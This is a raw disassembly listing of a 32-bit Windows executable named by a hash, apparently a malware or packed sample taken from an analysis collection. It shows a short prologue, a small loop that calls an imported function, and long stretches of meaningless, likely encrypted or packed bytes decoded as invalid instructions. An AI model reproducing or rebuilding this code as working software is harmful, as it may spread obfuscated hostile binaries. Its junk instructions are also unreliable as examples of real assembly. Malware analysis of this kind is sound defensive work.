
8575e94c968e3e05aabab00e64830f277607d4c4df137263504cfca00d6a1ab4.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    eax,ds:0x413bde
  40100e:	mov    DWORD PTR [ebp-0x18],eax
  401011:	jmp    0x40141f
  401016:	adc    BYTE PTR [ebp+esi*8-0x5e940e36],0x54
  40101e:	(bad)  
  40101f:	shr    DWORD PTR ds:0xdc94ff08,cl
  401025:	out    dx,eax
  401026:	jle    0x4010a6
  401028:	jle    0x4010a8
  40102a:	outs   dx,DWORD PTR ds:[esi]
  40102b:	jge    0x4010ab
  40102d:	jle    0x400ffd
  40102f:	xlat   BYTE PTR ds:[ebx]
  401030:	cmp    eax,0xcfd339d5
  401035:	rol    eax,1
  401037:	pop    es
  401038:	add    al,0x3
  40103a:	add    DWORD PTR [esi+0xf330f00],esi
  401040:	rcr    BYTE PTR [eax],0xc7
  401043:	adc    BYTE PTR [edi],bl
  401045:	mov    ecx,0xddb70058
  40104a:	push   cs
  40104b:	out    dx,eax
  40104c:	mov    ebp,0x8e03d6db
  401051:	es mov esi,0x1541a2f4
  401057:	lods   eax,DWORD PTR ds:[esi]
  401058:	fiadd  WORD PTR [esi+0x1f]
  40105b:	data16 in al,dx
  40105d:	outs   dx,DWORD PTR ds:[esi]
  40105e:	or     edx,DWORD PTR [ecx]
  401060:	pushf  
  401061:	js     0x401039
  401063:	inc    eax
  401064:	stos   BYTE PTR es:[edi],al
  401065:	push   ebx
  401066:	sub    eax,0xad3cc4d1
  40106b:	mov    bh,BYTE PTR [ebx-0x3b]
  40106e:	stos   DWORD PTR es:[edi],eax
  40106f:	push   es
  401070:	(bad)  
  401071:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401077:	jmp    0x4010a9
  401079:	mov    ebp,ecx
  40107b:	dec    edi
  40107c:	out    0xa6,al
  40107e:	inc    ecx
  40107f:	call   DWORD PTR [edi-0x2556f868]
  401085:	mov    ebp,0x5536ed4d
  40108a:	and    esi,DWORD PTR [edx-0x43619116]
  401090:	jnp    0x4010a3
  401092:	ret    
  401093:	xchg   edx,eax
  401094:	and    esp,edx
  401096:	jmp    0x4010f6
  401098:	ret    0xb8e4
  40109b:	lock jmp 0xd765:0x74cf3192
  4010a3:	and    ch,cl
  4010a5:	add    bl,cl
  4010a7:	adc    DWORD PTR [ecx-0x5a],edx
  4010aa:	xor    eax,0x78616f03
  4010af:	or     BYTE PTR [ecx],dh
  4010b1:	fisttp QWORD PTR [esi+0x7f752854]
  4010b7:	(bad)
  4010bc:	or     ebx,DWORD PTR [ebx+0x55]
  4010bf:	fst    st(6)
  4010c1:	or     ebx,edx
  4010c3:	pop    esp
  4010c4:	fstp   DWORD PTR [ecx]
  4010c6:	jno    0x401066
  4010c8:	inc    esi
  4010c9:	dec    ebx
  4010ca:	aaa    
  4010cb:	adc    eax,0x1a29772b
  4010d0:	sar    DWORD PTR [esi],cl
  4010d2:	dec    edi
  4010d3:	call   0xef6ab5a5
  4010d8:	aam    0x8b
  4010da:	inc    esp
  4010db:	in     al,dx
  4010dc:	outs   dx,DWORD PTR ds:[esi]
  4010dd:	push   esi
  4010de:	rcl    BYTE PTR [ebx],1
  4010e0:	lds    esi,FWORD PTR [edi]
  4010e2:	add    DWORD PTR [edi-0x3829d427],0x59
  4010e9:	mov    ebx,cs
  4010eb:	repnz pop gs
  4010ee:	(bad)  
  4010ef:	mov    dh,BYTE PTR [ebp+0x42772561]
  4010f5:	pop    ecx
  4010f6:	and    eax,0x373821dd
  4010fb:	test   al,0xda
  4010fd:	add    edx,ebx
  4010ff:	call   0xc3e9ee4e
  401104:	mov    al,0x73
  401106:	ins    DWORD PTR es:[edi],dx
  401107:	call   0x8ca1b20a
  40110c:	mov    ecx,0xe055ca05
  401111:	daa    
  401112:	xchg   edx,eax
  401113:	mov    edi,0xa71b50a6
  401118:	loope  0x401113
  40111a:	rcl    DWORD PTR [ecx],0x6f
  40111d:	adc    ch,BYTE PTR [edx+0x20ba72da]
  401123:	sub    eax,0x6fd61e5e
  401128:	std    
  401129:	add    al,0x19
  40112b:	inc    ecx
  40112c:	fisttp WORD PTR [edi+0x46d2803]
  401132:	mov    cl,0x40
  401134:	inc    ebp
  401135:	js     0x40118a
  401137:	mov    dh,0x35
  401139:	(bad)  
  40113a:	sbb    ebx,esp
  40113c:	add    al,0x9a
  40113e:	ss nop
  401140:	cmp    eax,0x1df59775
  401145:	gs jns 0x401198
  401148:	dec    ecx
  401149:	mov    edi,0xe1682c1a
  40114e:	inc    BYTE PTR [esi]
  401150:	pop    ebx
  401151:	inc    edx
  401152:	pop    edi
  401153:	adc    esp,edi
  401155:	add    dh,bl
  401157:	xchg   ecx,eax
  401158:	sbb    DWORD PTR [ecx+0x3e],esp
  40115b:	popf   
  40115c:	aas    
  40115d:	pop    esi
  40115e:	int    0xa9
  401160:	jb     0x401100
  401162:	dec    ebx
  401163:	call   0xb4bddbcd
  401168:	mov    edi,0x61922fba
  40116d:	fwait
  40116e:	clc    
  40116f:	nop
  401170:	xor    eax,0xb297e548
  401175:	mov    bl,al
  401177:	mov    BYTE PTR [eax+0x1e50055b],cl
  40117d:	mov    eax,0xa4fdcc9e
  401182:	aaa    
  401183:	mov    ebp,0xe18e277
  401188:	jg     0x40112e
  40118a:	call   0x89e5a12d
  40118f:	pop    edi
  401190:	add    BYTE PTR [ebp-0x404bc5dd],bl
  401196:	ja     0x4011f2
  401198:	dec    edi
  401199:	ss mov dl,0x72
  40119c:	into   
  40119d:	inc    di
  40119f:	test   DWORD PTR [edi-0x3fb88724],esp
  4011a5:	cli    
  4011a6:	jne    0x4011d1
  4011a8:	jle    0x40113f
  4011aa:	adc    DWORD PTR es:[eax+edx*1-0x63],ebx
  4011af:	inc    esp
  4011b0:	cmp    al,0xee
  4011b2:	enter  0xe98e,0xd
  4011b6:	or     al,0x9
  4011b8:	inc    ebp
  4011b9:	sub    eax,0xf88b2ccd
  4011be:	fcom   QWORD PTR [esp+ebp*4-0x4183eb7b]
  4011c5:	clc    
  4011c6:	fs dec ebp
  4011c8:	push   ebp
  4011c9:	in     al,dx
  4011ca:	jmp    0x401150
  4011cc:	mov    al,ds:0xd41505cb
  4011d1:	xchg   edi,eax
  4011d2:	stos   DWORD PTR es:[edi],eax
  4011d3:	das    
  4011d4:	adc    BYTE PTR [edi+0x4d],dh
  4011d7:	xchg   esp,eax
  4011d8:	ret    0x3451
  4011db:	test   DWORD PTR [edi],eax
  4011dd:	in     al,dx
  4011de:	fild   DWORD PTR [edx+0x36]
  4011e1:	mov    ah,cl
  4011e3:	imul   edi,DWORD PTR [edx],0x6eec00c1
  4011e9:	mov    ebp,0x7876f0a5
  4011ee:	(bad)  
  4011ef:	lock push es
  4011f1:	xor    al,0x55
  4011f3:	test   eax,0x55adccae
  4011f8:	or     ch,BYTE PTR [edx-0x50]
  4011fb:	inc    eax
  4011fc:	fwait
  4011fd:	mov    esi,0xf7486127
  401202:	daa    
  401203:	sbb    cl,0x39
  401206:	lods   al,BYTE PTR ds:[esi]
  401207:	inc    eax
  401208:	dec    eax
  401209:	mov    dl,0x2
  40120b:	lods   eax,DWORD PTR ds:[esi]
  40120c:	add    ebx,edx
  40120e:	repnz xor DWORD PTR [ebx+eax*1],0xe284233
  401216:	sub    al,0x5a
  401218:	pop    ss
  401219:	je     0x4011a6
  40121b:	and    dh,BYTE PTR [edi-0x24]
  40121e:	popf   
  40121f:	mov    ch,0x8f
  401221:	xchg   edx,eax
  401222:	push   ebx
  401223:	jg     0x401261
  401225:	ficomp WORD PTR ds:0x47f2055
  40122b:	adc    ah,BYTE PTR [ebx-0x652fb02]
  401231:	outs   dx,DWORD PTR ds:[esi]
  401232:	xor    BYTE PTR [eax+0x40],ah
  401235:	les    eax,FWORD PTR [edx-0x26]
  401238:	mov    ds:0xb93b74f9,al
  40123d:	inc    edx
  40123e:	or     BYTE PTR [ebp+0x53],bh
  401241:	(bad)  
  401242:	dec    edi
  401243:	fs push eax
  401245:	idiv   DWORD PTR [edi]
  401247:	jmp    0x2f945e89
  40124c:	pop    ss
  40124d:	add    al,0xc6
  40124f:	ins    BYTE PTR es:[edi],dx
  401250:	xor    al,BYTE PTR [edi+eiz*4-0x3f]
  401254:	icebp  
  401255:	sub    ecx,0xffffffba
  401258:	out    dx,al
  401259:	and    eax,0x546e60f4
  40125e:	mov    esp,ecx
  401260:	loop   0x4012db
  401262:	(bad)  
  401263:	cmp    BYTE PTR [ecx+0x52cd2b2a],al
  401269:	fnstenv [eax+0x63]
  40126c:	stos   BYTE PTR es:[edi],al
  40126d:	test   eax,0x33e69fa4
  401272:	scas   eax,DWORD PTR es:[edi]
  401273:	dec    eax
  401274:	pop    ds
  401275:	repz pusha 
  401277:	mov    eax,ds:0x8b3c4206
  40127c:	imul   bp,di,0xff94
  401280:	add    al,0xd2
  401282:	aaa    
  401283:	fnstcw WORD PTR [ebx]
  401285:	and    DWORD PTR [edi-0x74],esp
  401288:	in     al,0x56
  40128a:	(bad)  
  40128b:	neg    DWORD PTR ds:0x352afe74
  401292:	cld    
  401293:	sbb    eax,0x41e7fd37
  401298:	fsub   QWORD PTR [edi]
  40129a:	push   cs
  40129b:	xor    esp,DWORD PTR [esp+edi*8]
  40129e:	or     BYTE PTR [esi],bh
  4012a0:	imul   ebx,ebx,0xc6dd07e4
  4012a6:	fsub   st,st(6)
  4012a8:	mov    dh,0xe2
  4012aa:	mov    ecx,0x2957b4b8
  4012af:	repnz ficomp DWORD PTR [ebx+0x33]
  4012b3:	xlat   BYTE PTR ds:[ebx]
  4012b4:	pushf  
  4012b5:	sub    dh,BYTE PTR ds:0x6b07c958
  4012bb:	push   esp
  4012bc:	mov    edi,edx
  4012be:	cmp    ecx,DWORD PTR [edi*1-0xbbddfdb]
  4012c5:	inc    eax
  4012c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012c7:	cmp    BYTE PTR [esp+edx*1+0x40f26ba8],dh
  4012ce:	fistp  DWORD PTR [edi-0x3bd0b415]
  4012d4:	repnz mov esi,0xd36c19c0
  4012da:	retf   0x359f
  4012dd:	push   ebx
  4012de:	mul    DWORD PTR [ecx]
  4012e0:	in     al,dx
  4012e1:	mov    DWORD PTR [ecx],esi
  4012e3:	or     esp,DWORD PTR [edi+0x4f36126e]
  4012e9:	mov    BYTE PTR [ebx],bl
  4012eb:	push   esi
  4012ec:	sub    al,0x78
  4012ee:	test   DWORD PTR [eax-0x50],0x5e057bc6
  4012f5:	inc    edi
  4012f6:	inc    ecx
  4012f7:	pop    ds
  4012f8:	mov    dh,0x56
  4012fa:	sbb    eax,0xaad7df89
  4012ff:	inc    ebp
  401300:	ds dec edx
  401302:	ficomp WORD PTR [edi]
  401304:	sbb    bl,BYTE PTR [esi-0x7ec2656e]
  40130a:	(bad)  
  40130b:	dec    ecx
  40130c:	call   0x56e04a59
  401311:	shl    ecx,cl
  401313:	not    al
  401315:	sbb    cl,BYTE PTR [edx+ecx*1]
  401318:	fwait
  401319:	leave  
  40131a:	out    0x40,al
  40131c:	das    
  40131d:	mov    ch,0x29
  40131f:	int    0xe4
  401321:	xchg   BYTE PTR [ebp+0x4c1b33db],ch
  401327:	sbb    DWORD PTR [edi+0x676866ed],0x69
  40132e:	xchg   ebx,eax
  40132f:	sbb    BYTE PTR [ebp-0x12],bh
  401332:	or     eax,0xc7b02dbf
  401337:	lods   eax,DWORD PTR ds:[esi]
  401338:	cmp    ebx,DWORD PTR [eax-0xe]
  40133b:	icebp  
  40133c:	and    ch,BYTE PTR ds:0x39415fe5
  401342:	xchg   edx,eax
  401343:	enter  0xff2d,0x38
  401347:	aam    0xe0
  401349:	in     al,0x32
  40134b:	mov    esp,0xd2143b72
  401350:	push   eax
  401351:	xchg   ebx,eax
  401352:	(bad)  
  401353:	iret   
  401354:	sbb    eax,ecx
  401356:	bound  ebp,QWORD PTR [ebx]
  401358:	cmp    al,0xa8
  40135a:	rol    DWORD PTR [esp],1
  40135d:	test   ebp,esp
  40135f:	sub    eax,0x417731
  401364:	xchg   ecx,eax
  401365:	inc    edx
  401366:	xlat   BYTE PTR ds:[ebx]
  401367:	and    esp,DWORD PTR [ecx+0x57d1951a]
  40136d:	xor    ah,BYTE PTR [eax+0x3b8200a6]
  401373:	iret   
  401374:	out    dx,al
  401375:	jmp    0x4013c2
  401377:	adc    DWORD PTR [edx-0x67653504],ebx
  40137d:	loopne 0x4013e6
  40137f:	xor    eax,0x1b24d1a0
  401384:	and    BYTE PTR [eax+ecx*4+0x48],bl
  401388:	ins    DWORD PTR es:[edi],dx
  401389:	aam    0xc
  40138b:	out    0x73,al
  40138d:	aad    0x7f
  40138f:	xchg   edi,eax
  401390:	test   DWORD PTR [ebx],ebx
  401392:	xchg   ebx,eax
  401393:	mov    edx,0xda483e6b
  401398:	xor    BYTE PTR [ebx-0x59],bl
  40139b:	jmp    0xddb62b67
  4013a0:	mov    bl,0x1a
  4013a2:	xor    ebp,DWORD PTR [ebx-0x3c]
  4013a5:	add    DWORD PTR [ebp-0x36ddf6fe],esi
  4013ab:	cwde   
  4013ac:	xchg   ebx,eax
  4013ad:	lods   al,BYTE PTR ds:[esi]
  4013ae:	dec    eax
  4013af:	or     DWORD PTR ds:0x2b650894,0xffffffad
  4013b6:	xchg   ecx,eax
  4013b7:	int    0xc3
  4013b9:	inc    edi
  4013bb:	inc    edx
  4013bc:	xor    DWORD PTR [ebx-0xbbb7297],0xc1ec66c0
  4013c6:	inc    ecx
  4013c7:	cmp    BYTE PTR [ebp+eax*2+0x120ca89a],dh
  4013ce:	inc    ebx
  4013cf:	mov    ah,0x36
  4013d1:	jno    0x40137e
  4013d3:	jmp    0xb44:0x4b689716
  4013da:	repnz pop edx
  4013dc:	into   
  4013dd:	xor    dh,ah
  4013df:	jg     0x401419
  4013e1:	(bad)  
  4013e3:	ret    
  4013e4:	xchg   ebp,eax
  4013e5:	(bad)  
  4013e7:	test   BYTE PTR [edx+0x23],cl
  4013ea:	jge    0x40139f
  4013ec:	mov    ch,BYTE PTR [edx+0x4ffa11cd]
  4013f2:	or     cl,BYTE PTR [edi+0x11]
  4013f5:	sbb    DWORD PTR [edx+eax*8],esi
  4013f8:	hlt    
  4013f9:	or     DWORD PTR ds:0x4b83e5b6,ebp
  4013ff:	mov    dl,0x28
  401401:	push   eax
  401402:	jecxz  0x4013a2
  401404:	loop   0x4013bc
  401406:	call   0x272fa557
  40140b:	bts    DWORD PTR [ebp+0x6108d6ff],esp
  401412:	in     eax,dx
  401413:	loopne 0x40144e
  401415:	imul   ebx,edx,0xd4dfad4d
  40141b:	jbe    0x4013ee
  40141d:	and    cl,BYTE PTR [esi]
  40141f:	mov    eax,ds:0x413cee
  401424:	mov    DWORD PTR [ebp-0x48],eax
  401427:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40142e:	adc    eax,0x6013
  401433:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  40143a:	adc    eax,ecx
  40143c:	mov    eax,DWORD PTR [ebp-0x10]
  40143f:	mov    ecx,DWORD PTR ds:0x43374b
  401445:	mov    ecx,DWORD PTR [ecx]
  401447:	or     DWORD PTR ds:0x433773,ecx
  40144d:	push   ebx
  40144e:	push   esi
  40144f:	sbb    DWORD PTR ds:0x4337eb,edi
  401455:	mov    esi,0x7510854
  40145a:	movzx  ecx,BYTE PTR ds:0x4337f3
  401461:	sbb    DWORD PTR ds:0x4337ef,ecx
  401467:	xor    eax,esi
  401469:	and    ebx,ecx
  40146b:	push   edi
  40146c:	mov    DWORD PTR ds:0x433843,0x1c
  401476:	cmp    DWORD PTR ds:0x433843,0x0
  40147d:	je     0x4014ab
  401483:	cmp    DWORD PTR ds:0x433843,0x25
  40148a:	jne    0x401499
  401490:	push   DWORD PTR [ebp-0x20]
  401493:	call   DWORD PTR ds:0x412288
  401499:	mov    ebx,DWORD PTR ds:0x433843
  40149f:	dec    ebx
  4014a0:	mov    DWORD PTR ds:0x433843,ebx
  4014a6:	jmp    0x401476
  4014ab:	mov    edi,0x32729b
  4014b0:	jmp    0x4018be
  4014b5:	xchg   ecx,eax
  4014b6:	mov    ds:0x59f479c4,eax
  4014bb:	push   ecx
  4014bc:	mov    bl,0x68
  4014be:	push   ebp
  4014bf:	out    dx,eax
  4014c0:	xor    ebx,DWORD PTR [ebp+0x12]
  4014c3:	xor    DWORD PTR ds:[edi+0x7d],ebp
  4014c7:	jle    0x401547
  4014c9:	outs   dx,DWORD PTR ds:[esi]
  4014ca:	jge    0x40154a
  4014cc:	jle    0x4014fe
  4014ce:	mov    edx,0x56de909
  4014d3:	cmc    
  4014d4:	pop    eax
  4014d5:	cwde   
  4014d6:	push   ds
  4014d7:	xchg   ebx,eax
  4014d8:	and    bl,bh
  4014da:	inc    edx
  4014db:	add    esi,DWORD PTR [edi-0x28]
  4014de:	adc    DWORD PTR [ebx],ebp
  4014e0:	jp     0x4014e6
  4014e2:	and    eax,0x5b3e25ab
  4014e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014e8:	addr16 out 0x7a,eax
  4014eb:	in     eax,0x4f
  4014ed:	push   esp
  4014ee:	out    dx,eax
  4014ef:	mov    ds:0xcfc2fb96,al
  4014f4:	xlat   BYTE PTR ds:[ebx]
  4014f5:	xchg   al,bl
  4014f7:	jmp    0x4014ba
  4014f9:	fs popf 
  4014fb:	and    eax,0x1d0ae68a
  401500:	mov    ch,0x20
  401502:	mov    al,0x2b
  401504:	or     DWORD PTR [ecx+ecx*8],edx
  401507:	fcomp  QWORD PTR [edx]
  401509:	jmp    esi
  40150b:	xchg   edi,eax
  40150c:	jbe    0x4014d2
  40150e:	stos   BYTE PTR es:[edi],al
  40150f:	retf   
  401510:	sbb    DWORD PTR [edi-0x4220645],ebp
  401516:	loop   0x40153a
  401518:	mov    bl,0xc8
  40151a:	sbb    eax,0xc38f8db
  40151f:	inc    ebx
  401520:	je     0x4014e6
  401522:	or     DWORD PTR ds:0x80bf458a,0xf2c8a49d
  40152c:	jmp    FWORD PTR [ebp-0x1c]
  40152f:	and    BYTE PTR [edi+0x19],dl
  401532:	adc    eax,0xb1acd492
  401537:	lahf   
  401538:	call   eax
  40153a:	xchg   esp,eax
  40153b:	mov    ah,0x56
  40153d:	jl     0x401554
  40153f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401540:	mov    ebp,?
  401542:	dec    eax
  401543:	dec    ecx
  401544:	imul   edx,DWORD PTR [ecx],0xffffffaf
  401547:	test   DWORD PTR [edi],esp
  401549:	push   0x84c05634
  40154e:	shl    cl,cl
  401550:	push   edx
  401551:	aam    0xe
  401553:	lock call 0x6dacfc4a
  401559:	pusha  
  40155a:	lods   al,BYTE PTR ds:[esi]
  40155b:	mov    ebx,0xdc007ad3
  401560:	seto   BYTE PTR [eax+0x53]
  401564:	jmp    0x4014fd
  401566:	into   
  401567:	push   esi
  401568:	jno    0x401529
  40156a:	mov    edi,DWORD PTR ds:0x84fab6be
  401570:	mov    fs,WORD PTR [ebx+0x20]
  401573:	ins    BYTE PTR es:[edi],dx
  401574:	add    al,0xd3
  401576:	push   edi
  401577:	js     0x401556
  401579:	mov    esp,0x12cfd993
  40157e:	mov    ebp,0xc5e9a25c
  401583:	inc    edi
  401584:	push   edi
  401585:	ret    0x1a4b
  401588:	stc    
  401589:	add    edx,ecx
  40158b:	push   edi
  40158c:	call   0xc2b64b26
  401591:	rcr    DWORD PTR [ecx],1
  401593:	push   ebx
  401594:	jle    0x401554
  401596:	push   esp
  401597:	jnp    0x4015e5
  401599:	shl    bh,1
  40159b:	adc    DWORD PTR [edx+0x11],ebx
  40159e:	shl    BYTE PTR [esi],1
  4015a0:	xchg   edx,eax
  4015a1:	shl    DWORD PTR [edx+0x691df91c],cl
  4015a7:	stos   DWORD PTR es:[edi],eax
  4015a8:	out    dx,eax
  4015a9:	pop    eax
  4015aa:	push   edi
  4015ab:	sahf   
  4015ac:	out    0x73,eax
  4015ae:	int3   
  4015af:	mov    eax,edx
  4015b1:	ins    BYTE PTR es:[edi],dx
  4015b2:	mov    ebp,0x6876a1bc
  4015b7:	jmp    0xd3e14784
  4015bc:	xor    BYTE PTR [ebx],bl
  4015be:	and    esi,DWORD PTR [ebx-0x3867d5f5]
  4015c4:	mov    ch,ah
  4015c6:	pop    ebp
  4015c7:	mov    ebp,0x681e5e45
  4015cc:	mov    al,ds:0x504a52f3
  4015d1:	loopne 0x401611
  4015d3:	push   edi
  4015d4:	into   
  4015d5:	jbe    0x40162e
  4015d7:	jnp    0x401650
  4015d9:	data16 cmc 
  4015db:	mov    esi,gs
  4015dd:	addr16 push ecx
  4015df:	mov    bh,0xee
  4015e1:	add    eax,0xb75d86ed
  4015e6:	daa    
  4015e7:	aam    0xb4
  4015e9:	test   al,0xe0
  4015eb:	jl     0x40161c
  4015ed:	sub    BYTE PTR [ebx-0x1325ed6c],dh
  4015f3:	xlat   BYTE PTR ds:[ebx]
  4015f4:	pop    esp
  4015f5:	aad    0x55
  4015f7:	icebp  
  4015f8:	fistp  QWORD PTR [edi]
  4015fa:	mov    BYTE PTR [ecx+eiz*4+0xb],bl
  4015fe:	sbb    BYTE PTR [ecx+0x11eaffc5],bh
  401604:	out    dx,eax
  401605:	xchg   edx,eax
  401606:	cdq    
  401607:	js     0x401598
  401609:	sub    BYTE PTR [esi],cl
  40160b:	leave  
  40160c:	sub    eax,0x4409fdce
  401611:	ror    DWORD PTR [edx],cl
  401613:	and    DWORD PTR [esi-0x7c333145],ebx
  401619:	mov    esp,0x3cd0dabe
  40161e:	jbe    0x40160f
  401620:	or     DWORD PTR [ebp-0x5c8c5cec],edi
  401626:	test   eax,0xa8350097
  40162b:	xchg   ecx,eax
  40162c:	fistp  DWORD PTR [esi+0x75]
  40162f:	lods   eax,DWORD PTR ds:[esi]
  401630:	dec    eax
  401631:	inc    ebx
  401632:	cs pushf 
  401634:	retf   
  401635:	sbb    al,0xff
  401637:	jae    0x401649
  401639:	aaa    
  40163a:	cs test ah,cl
  40163d:	(bad)
  401641:	xor    cl,BYTE PTR [edx+0x6de3ec47]
  401647:	and    bl,0x7a
  40164a:	retf   
  40164b:	mov    ecx,DWORD PTR [edx+0x14]
  40164e:	fcomp  QWORD PTR [edi-0x7bcfb410]
  401654:	jmp    0x97a2:0x8fdf1626
  40165b:	xor    al,0xef
  40165d:	pop    ss
  40165e:	mov    ebx,0x66695fa5
  401663:	xchg   edi,eax
  401664:	mov    WORD PTR [eax],?
  401666:	out    dx,al
  401667:	or     DWORD PTR [eax+ebx*1+0x2],esp
  40166b:	sar    DWORD PTR [ebx+0x8],0x28
  40166f:	inc    esp
  401670:	and    BYTE PTR [eax-0xc7c3343],ah
  401676:	jne    0x4016a1
  401678:	cmp    edi,esp
  40167a:	xchg   edx,eax
  40167b:	sbb    al,0x40
  40167d:	mov    ebp,0x167cc57b
  401682:	jnp    0x401666
  401684:	ins    DWORD PTR es:[edi],dx
  401685:	push   esi
  401686:	out    0x42,al
  401688:	jbe    0x401694
  40168a:	mov    ds:0x8a53b535,eax
  40168f:	sub    BYTE PTR [edx],ah
  401691:	add    DWORD PTR [ebp+0x4f],edi
  401694:	xor    DWORD PTR [ebx-0x5d],ebp
  401697:	jne    0x401646
  401699:	sub    ebx,ebx
  40169b:	mov    DWORD PTR [edx+0x21],esi
  40169e:	xor    ch,BYTE PTR [ebx+0x1c]
  4016a1:	mov    bh,0xdb
  4016a3:	in     eax,0x1f
  4016a5:	ins    DWORD PTR es:[edi],dx
  4016a6:	and    al,0xd4
  4016a8:	jg     0x4016bb
  4016aa:	iret   
  4016ab:	arpl   WORD PTR gs:0xa60e1d58,ax
  4016b2:	test   eax,eax
  4016b4:	and    eax,0x97ca8b15
  4016b9:	lahf   
  4016ba:	adc    BYTE PTR [ebx+ebx*8-0x2d],dl
  4016be:	dec    esi
  4016bf:	push   0x7206f699
  4016c4:	dec    ebx
  4016c5:	mov    bl,0xbe
  4016c7:	sbb    esi,DWORD PTR [edi+0x4671a82d]
  4016cd:	ret    
  4016ce:	fadd   st,st(0)
  4016d0:	(bad)  
  4016d2:	fs fucomi st,st(1)
  4016d6:	xchg   ebp,eax
  4016d7:	mov    bl,BYTE PTR [ebx+0x3d006fbd]
  4016dd:	data16 jbe 0x401677
  4016e0:	ds jmp 0xdfcd:0xad017a1d
  4016e8:	jnp    0x4016b9
  4016ea:	mov    edx,0xb88b4450
  4016ef:	push   edi
  4016f0:	sub    BYTE PTR [edi+eax*1-0x40],0x35
  4016f5:	xlat   BYTE PTR ds:[ebx]
  4016f6:	mov    bh,0x8c
  4016f8:	xchg   edi,eax
  4016f9:	inc    ebp
  4016fa:	push   ds
  4016fb:	xchg   ebx,eax
  4016fc:	ins    BYTE PTR es:[edi],dx
  4016fd:	outs   dx,DWORD PTR ds:[esi]
  4016fe:	and    ebp,DWORD PTR [edx+eiz*2-0x7a43521]
  401705:	aad    0xe2
  401707:	clc    
  401708:	dec    ecx
  401709:	push   es
  40170a:	sbb    ebx,DWORD PTR [edi]
  40170c:	dec    edx
  40170d:	push   ebx
  40170e:	fcomp  DWORD PTR [eax+0x44e24d71]
  401714:	xchg   ebx,eax
  401715:	(bad)  [edi+0x76]
  401718:	inc    edx
  401719:	xchg   ebx,eax
  40171a:	xchg   edx,eax
  40171b:	mov    eax,ds:0xa226deab
  401720:	(bad)  
  401722:	sub    BYTE PTR [edi+ebp*8+0x195d1fd],ch
  401729:	jo     0x4016ac
  40172b:	sti    
  40172c:	imul   ecx,DWORD PTR [edi+0x20],0x12a35430
  401733:	repz xor BYTE PTR [ebx-0x18],dl
  401737:	lods   eax,DWORD PTR ds:[esi]
  401738:	xchg   edi,eax
  401739:	retf   
  40173a:	mov    al,ds:0x2ab9d1f2
  40173f:	mov    ebx,0x18d9586e
  401744:	das    
  401745:	sbb    BYTE PTR [esi+0x24f88799],ah
  40174b:	rcr    BYTE PTR [edx-0x46],cl
  40174e:	push   ecx
  40174f:	push   ecx
  401750:	arpl   WORD PTR [ecx+ebp*4+0x7da76132],si
  401757:	jg     0x40174e
  401759:	fidivr DWORD PTR [esi]
  40175b:	jle    0x40177a
  40175d:	sbb    DWORD PTR [eax-0x33],esi
  401760:	sub    eax,0xbd99f364
  401765:	pop    eax
  401766:	xor    edx,DWORD PTR [eax]
  401768:	out    0x64,al
  40176a:	fwait
  40176b:	xlat   BYTE PTR ds:[ebx]
  40176c:	push   edi
  40176d:	fdivr  DWORD PTR [eax]
  40176f:	imul   edx,DWORD PTR [ecx]
  401772:	xchg   ebp,eax
  401773:	push   ebp
  401774:	mov    ebp,0xc41812f2
  401779:	sbb    edx,DWORD PTR [ebp-0x2ab2c6c5]
  40177f:	mov    cl,0xd0
  401781:	and    eax,0xda699c42
  401786:	jl     0x401716
  401788:	and    al,0xf1
  40178a:	xchg   edi,eax
  40178b:	bound  eax,QWORD PTR [ebx]
  40178d:	add    al,BYTE PTR [ecx]
  40178f:	dec    ecx
  401790:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401791:	lock mov eax,ds:0xbdcebf92
  401797:	mov    dh,0xbe
  401799:	test   al,0x5e
  40179b:	dec    ebp
  40179c:	ds sbb eax,0xc81fd38e
  4017a2:	shl    BYTE PTR [ebx-0x47],cl
  4017a5:	rcl    esp,0xd3
  4017a8:	push   edi
  4017a9:	test   al,0x7
  4017ab:	inc    esi
  4017ac:	in     al,dx
  4017ad:	add    al,0x81
  4017af:	fimul  DWORD PTR [edi-0x6a071482]
  4017b5:	sti    
  4017b6:	jne    0x4017af
  4017b8:	call   0xd9eb:0x1f200c4c
  4017bf:	scas   al,BYTE PTR es:[edi]
  4017c0:	ficom  WORD PTR [ebp+0x5a]
  4017c3:	xchg   esi,eax
  4017c4:	mov    bl,0xf
  4017c6:	sub    al,0xaa
  4017c8:	scas   eax,DWORD PTR es:[edi]
  4017c9:	pushf  
  4017ca:	out    dx,al
  4017cb:	mov    ds:0x5c5e5282,al
  4017d0:	int    0x1e
  4017d2:	xchg   edi,eax
  4017d3:	xor    al,0x8f
  4017d5:	push   cs
  4017d6:	mov    dh,0xb5
  4017d8:	jge    0x4017bf
  4017da:	mov    ecx,0xb3bdd69a
  4017df:	mov    ch,BYTE PTR [ecx]
  4017e1:	adc    BYTE PTR [edi+0x3c],dl
  4017e4:	rcl    edx,cl
  4017e6:	adc    BYTE PTR [edx],ch
  4017e8:	inc    esi
  4017e9:	call   0xa4e313b5
  4017ee:	ds mov ch,0x84
  4017f1:	ins    BYTE PTR es:[edi],dx
  4017f2:	adc    eax,0x53adc78a
  4017f7:	int3   
  4017f8:	mov    al,0xce
  4017fa:	test   BYTE PTR [edi-0x2a52d46],bl
  401800:	xchg   esi,eax
  401801:	cld    
  401802:	(bad)  
  401803:	je     0x401880
  401805:	mov    ecx,0x8f7921e4
  40180a:	sahf   
  40180b:	arpl   WORD PTR [esi-0x4f76122b],bx
  401811:	push   ds
  401812:	xchg   ebx,eax
  401813:	jge    0x40186d
  401815:	adc    BYTE PTR [eax+0xa415c77],cl
  40181b:	test   al,0xf1
  40181d:	call   0xf47e87eb
  401822:	xor    eax,0x55f55c2f
  401827:	add    al,0x94
  401829:	jo     0x4017cb
  40182b:	mov    edx,0x9615715b
  401830:	out    0xfc,eax
  401832:	data16 mov al,0xb9
  401835:	pop    edi
  401836:	and    bh,ch
  401838:	imul   eax,DWORD PTR [esi],0xffffffa8
  40183b:	mov    ah,0xc8
  40183d:	jl     0x401867
  40183f:	shl    BYTE PTR [ebx],1
  401841:	rcr    BYTE PTR [edi+0x1a5e122d],0x2d
  401848:	xor    esp,ecx
